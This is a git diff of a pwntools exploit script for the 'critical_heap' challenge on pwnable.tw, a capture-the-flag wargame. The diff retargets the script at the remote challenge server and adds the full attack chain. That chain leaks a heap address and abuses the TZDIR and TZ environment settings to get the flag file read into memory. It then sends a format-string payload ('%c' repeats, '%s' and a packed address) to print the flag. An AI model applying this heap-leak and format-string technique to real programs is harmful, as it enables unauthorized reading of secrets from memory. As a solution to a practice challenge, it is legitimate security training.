@@ -4,10 +4,10 @@ from pwn import *
 
 context.update(log_level='debug', arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
 
-p = process('./critical_heap')
-#p = remote('chall.pwnable.tw', 10500)
+#p = process('./critical_heap')
+p = remote('chall.pwnable.tw', 10500)
 
-Debug = True
+Debug = False
 
 if Debug:
     gdb.attach(p, '''
@@ -75,12 +75,46 @@ p.sendlineafter('Your choice : ', '5')
 
 delete_heap(0)
 
-create_heap('normal_heap', 1, 'A' * 8)
+create_heap('normal_heap', 1, 'A' * 8) #0
 
 show_heap(0)
 p.recvuntil('A' * 8)
 leak_addr = u32(p.recv(4))
 log.success('leak_addr = ' + hex(leak_addr))
+
+create_heap('system_heap2', 3) #1
+#play heap
+p.sendlineafter('Your choice : ', '4')
+p.sendlineafter('Index of heap :', '1')
+# set
+p.sendlineafter('Your choice : ', '1')
+p.sendlineafter('Give me a name for the system heap :', 'TZDIR')
+p.sendlineafter('Give me a value for this name :', '/home/critical_heap++')
+# set
+p.sendlineafter('Your choice : ', '1')
+p.sendlineafter('Give me a name for the system heap :', 'TZ')
+p.sendlineafter('Give me a value for this name :', 'flag')
+# return
+p.sendlineafter('Your choice : ', '5')
+
+create_heap('clock_heap', 2) #2
+
+#flag_offset = 0x47b
+flag_offset = 0x4ab
+flag_addr = leak_addr + flag_offset
+
+log.success('leak_addr = ' + hex(leak_addr))
+log.success('flag_addr = ' + hex(flag_addr))
+
+
+#play heap
+p.sendlineafter('Your choice : ', '4')
+p.sendlineafter('Index of heap :', '0')
+# change
+p.sendlineafter('Your choice : ', '2')
+p.sendlineafter('Content :', '%c%c%c%c%c%c%c%c%c%c%c%c%sAAAAAA' + p64(flag_addr))
+# show
+p.sendlineafter('Your choice : ', '1')
 
 p.recvuntil('Your choice : ')
 
